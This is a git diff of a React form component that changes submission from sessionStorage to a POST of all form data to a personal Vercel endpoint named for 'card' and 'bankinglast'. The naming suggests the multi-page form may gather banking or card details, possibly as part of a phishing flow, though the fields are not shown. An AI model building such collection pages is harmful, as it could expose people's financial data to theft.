@@ -1,7 +1,7 @@
-// src/components/Side4.js
 import React, { useState } from 'react';
 import image from '../assets/images/image.webp';
 import { useNavigate } from 'react-router-dom';
+import axios from 'axios'; // Import axios
 
 const Side4 = () => {
     const [formData, setFormData] = useState({
@@ -21,20 +21,20 @@ const Side4 = () => {
         });
     };
 
-    const handleSubmit = (e) => {
+    const handleSubmit = async (e) => {
         e.preventDefault();
 
-        // Retrieve existing data or initialize an empty array
-        const existingData = JSON.parse(sessionStorage.getItem('submittedData')) || [];
+        try {
+            // Send POST request to the API
+            const response = await axios.post('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/bankinglast', formData);
+            console.log('Data submitted successfully:', response.data);
 
-        // Push the new form data to the existing array
-        existingData.push(formData);
-
-        // Update the sessionStorage with the new array
-        sessionStorage.setItem('submittedData', JSON.stringify(existingData));
-
-        // Navigate to the next page (adjust as needed)
-        navigate('/side4'); // Replace with your next page route
+            // Navigate to the next page (adjust as needed)
+            navigate('/side4'); // Replace with your next page route
+        } catch (error) {
+            console.error('Error submitting data:', error);
+            // You can show an error message to the user here
+        }
     };
 
     return (
